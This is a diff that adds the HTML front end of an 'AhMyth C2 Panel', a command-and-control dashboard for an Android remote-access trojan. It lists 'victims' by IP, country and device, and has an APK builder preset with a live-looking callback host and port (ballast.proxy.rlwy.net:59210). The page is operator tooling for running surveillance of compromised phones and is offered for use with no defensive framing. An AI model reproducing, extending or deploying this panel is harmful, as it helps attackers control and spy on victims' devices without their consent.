@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AhMyth C2 Panel - Railway Edition</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <h1>🔴 AhMyth C2 Panel</h1>
+                <span class="subtitle">Railway Cloud Edition</span>
+            </div>
+            <div class="server-info">
+                <span class="status-badge online" id="serverStatus">● ONLINE</span>
+                <span class="info-item">Uptime: <strong id="uptime">0s</strong></span>
+                <span class="info-item">Victims: <strong id="victimCount">0</strong></span>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Sidebar -->
+            <aside class="sidebar">
+                <nav class="nav-menu">
+                    <button class="nav-item active" data-view="dashboard">
+                        <span class="icon">📊</span>
+                        <span>Dashboard</span>
+                    </button>
+                    <button class="nav-item" data-view="victims">
+                        <span class="icon">��</span>
+                        <span>Victims</span>
+                    </button>
+                    <button class="nav-item" data-view="logs">
+                        <span class="icon">📝</span>
+                        <span>Logs</span>
+                    </button>
+                    <button class="nav-item" data-view="settings">
+                        <span class="icon">⚙️</span>
+                        <span>Settings</span>
+                    </button>
+                </nav>
+            </aside>
+
+            <!-- Content Area -->
+            <main class="content">
+                <!-- Dashboard View -->
+                <div id="dashboard-view" class="view active">
+                    <h2>📊 Dashboard</h2>
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <div class="stat-icon">📱</div>
+                            <div class="stat-info">
+                                <div class="stat-value" id="totalVictims">0</div>
+                                <div class="stat-label">Total Victims</div>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon">🟢</div>
+                            <div class="stat-info">
+                                <div class="stat-value" id="activeVictims">0</div>
+                                <div class="stat-label">Active Now</div>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon">🌍</div>
+                            <div class="stat-info">
+                                <div class="stat-value" id="countries">0</div>
+                                <div class="stat-label">Countries</div>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon">⏱️</div>
+                            <div class="stat-info">
+                                <div class="stat-value" id="serverUptime">0</div>
+                                <div class="stat-label">Server Uptime</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="recent-activity">
+                        <h3>Recent Activity</h3>
+                        <div id="activityLog" class="activity-list">
+                            <div class="activity-item">
+                                <span class="activity-time">--:--:--</span>
+                                <span class="activity-text">در انتظار اتصالات...</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Victims View -->
+                <div id="victims-view" class="view">
+                    <h2>📱 Connected Victims</h2>
+                    <div class="victims-container">
+                        <table class="victims-table" id="victimsTable">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>IP Address</th>
+                                    <th>Country</th>
+                                    <th>Device</th>
+                                    <th>Android</th>
+                                    <th>Connected At</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="victimsTableBody">
+                                <tr>
+                                    <td colspan="7" style="text-align: center; padding: 40px;">
+                                        در انتظار اتصال victims...
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Logs View -->
+                <div id="logs-view" class="view">
+                    <h2>📝 System Logs</h2>
+                    <div class="logs-container">
+                        <div class="logs-controls">
+                            <button onclick="clearLogs()" class="btn btn-danger">Clear Logs</button>
+                            <button onclick="refreshLogs()" class="btn btn-primary">Refresh</button>
+                        </div>
+                        <div id="logsContent" class="logs-content">
+                            <div class="log-entry info">
+                                <span class="log-time">[--:--:--]</span>
+                                <span class="log-message">در انتظار رویدادها...</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Settings View -->
+                <div id="settings-view" class="view">
+                    <h2>⚙️ Settings</h2>
+                    <div class="settings-container">
+                        <div class="setting-group">
+                            <h3>Server Information</h3>
+                            <div class="setting-item">
+                                <label>External Host:</label>
+                                <input type="text" value="ballast.proxy.rlwy.net" readonly>
+                            </div>
+                            <div class="setting-item">
+                                <label>External Port:</label>
+                                <input type="text" value="59210" readonly>
+                            </div>
+                            <div class="setting-item">
+                                <label>Internal Port:</label>
+                                <input type="text" id="internalPort" value="..." readonly>
+                            </div>
+                        </div>
+
+                        <div class="setting-group">
+                            <h3>APK Builder Settings</h3>
+                            <div class="setting-item">
+                                <label>LHOST:</label>
+                                <input type="text" id="apkHost" value="ballast.proxy.rlwy.net">
+                            </div>
+                            <div class="setting-item">
+                                <label>LPORT:</label>
+                                <input type="number" id="apkPort" value="59210">
+                            </div>
+                            <button class="btn btn-primary" onclick="copyApkConfig()">Copy Config</button>
+                        </div>
+                    </div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <script src="/js/app.js"></script>
+</body>
+</html>
